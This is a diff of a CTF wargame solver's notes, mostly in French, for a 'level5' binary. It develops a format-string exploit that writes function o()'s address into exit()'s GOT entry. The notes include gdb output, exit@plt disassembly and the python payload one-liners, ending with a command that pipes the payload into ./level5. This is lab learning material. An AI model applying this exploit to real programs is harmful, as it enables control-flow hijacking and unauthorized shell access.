@@ -1,17 +1,15 @@
-
-
 in printf eip is at 0xbffff4fc
-function o is at 0x080484a4 
+function o is at 0x080484a4
 let's put this adress in EIP
 
 
-python -c "print '\xfc\xf4\xff\xbf' + '%134513824x' + '%4\$n'") 
+python -c "print '\xfc\xf4\xff\xbf' + '%134513824x' + '%4\$n'")
 
 ne marche pas avec 24, 25, 26 plante au milieu de la fonction (<o+2>)
 
 j'arrive pas à lancer function o()
 
-donc j'essaye au milieu de la fonction 
+donc j'essaye au milieu de la fonction
 addresse 0x080484b1
 
 (gdb) print 0x080484aa
@@ -27,5 +25,16 @@ on peut reecrire GOT ( global offset table) on reecrie exit()
 
 on choppe l'adresse de exit dans la GOT et on y ecris l'adresse o()
 
-<<<$(python -c "print '\x38\x98\x04\x08' + '%134513824x' + '' + '%4\$n'")
+```
+(gdb) info function exit
+# 0x080483d0  exit
 
+disas 0x080483d0
+# Dump of assembler code for function exit@plt:
+#   0x080483d0 <+0>:     jmp    DWORD PTR ds:0x8049838
+#   0x080483d6 <+6>:     push   0x28
+#   0x080483db <+11>:    jmp    0x8048370
+# End of assembler dump.
+```
+
+(python -c "print '\x38\x98\x04\x08' + '%134513824x' + '' + '%4\$n'"; cat) | ./level5
